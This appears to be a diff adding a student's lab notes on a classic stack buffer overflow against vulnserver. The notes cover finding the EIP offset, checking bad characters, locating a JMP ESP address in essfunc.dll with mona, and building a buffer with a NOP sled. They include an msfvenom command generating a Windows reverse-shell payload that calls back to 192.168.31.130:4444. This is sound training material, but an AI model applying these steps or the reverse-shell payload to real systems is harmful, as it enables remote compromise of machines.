@@ -1,0 +1,91 @@
+Finding Offset:
+Offset can be found using command: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+Set the value of l depending on where the crash happened in fuzzing
+
+Then you have to match the offset. For this, take the value of q from EIP in Immunity debugger and run the command below.
+The value from q is from the EIP value shown in Immunity Debugger post the crash
+
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
+[*] Exact match at offset 2003
+
+Once this is done, you can run the overwriting the EIP script.
+
+Once we are able to overwrite the EIP, we need to confirm if there are any bad characters which cannot be in our payload.
+
+For this, you can go to https://github.com/cytopia/badchars and just copy the badchars listed there.
+You can paste it in your python script after the offset values and EIP values.
+
+Important Note: Remove "\x00" from the badchars as this will anyways cause issues. Then run the script.
+
+Once done, go to Immunity and right click on the ESP value and follow it in dump. Then check if any characters are replaced by any other characters which will mean that these are bad characters. Watch the TCM video or mediuym blog for more info regarding this.
+
+Once the bad characters are confirmed, we have to find the right module.
+
+For this, we need Mona modules.
+https://github.com/corelan/mona
+
+Copy the mona.py file and add it with other scripts of the Immunity Debugger in the PyCommands folder.
+Once this is done, mona will work with Immunity.
+
+Type in the bar at the bottom
+!mona modules
+
+We need to check for a module which has False for all protection settings and one that is attached to vulnserver which you can confirm in the path of the module.
+
+Once you select the module, in this case we select essfunc.dll as that was the most suitable and satisfied all prerequisites listed above, we need to find the opcode equivalent of a JMP address
+
+Go back to kali:
+locate nasm_shell
+
+Then run: /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm > JMP ESP
+00000000  FFE4              jmp esp
+nasm > exit
+
+This means our opcode equivalent of our Jump address is FFE4
+
+Now we need to go back to immunity and type in the below command:
+
+!mona find -s "\xff\xe4" -m essfunc.dll
+
+Now once this is run, check the Results section for return addresses. For eg - 
+0X625011af --> this is a return address.
+
+Now, we will go to Kali and create a script for finding right modules
+
+We will replace the 4 B's that we had in our previous script and instead add this return address. This address will basically point to our malicious code.
+
+This return address needs to be added in reverse.
+eg - the address is 625011af
+in the script , we will add this as : "\xaf\x11\x50\x62"
+
+This is because we need to keep this in Little Endian format.
+
+Now, once this script is ready, go back to Immunity and click on the "Go to address in Disassembler" button. 
+Now there, you can type 625011af. This will take you to that location.
+
+Then press f2 and it will be highlighted in blue. This means that we have created this as a break point.
+Now, the program will jump to this location and break and then from here it will later point to our malicious code.
+
+Now, when you will run the script. In immunity, the program will crash and you will see the EIP highlighted with 625011AF
+
+This means that the program crashed successfully on reaching the breakpoint set by us, and now we can generate our payload and execute it.
+
+We generate the payload using msfvenom
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.31.130 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+
+p --> payload (because we are attacking a windows machine) , we are assuming x86 , if it is x64 we will adjust it later.
+LHOST and LPORT --> kali machine IP and port
+EXITFUNC --> this makes our exploit stable
+f --> filetype (we have set it in c)
+a --> architecture
+b --> bad chars (if we found any bad chars we will define it here)
+
+Once this is done, copy the payload and add it to your script foe exploit.
+
+We also need to add what are called as NOPS (No Operation) . This basically provides padding before the payload.
+
+eg-
+shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow
+
+The "\x90" * 32 is the padding we have entered. 
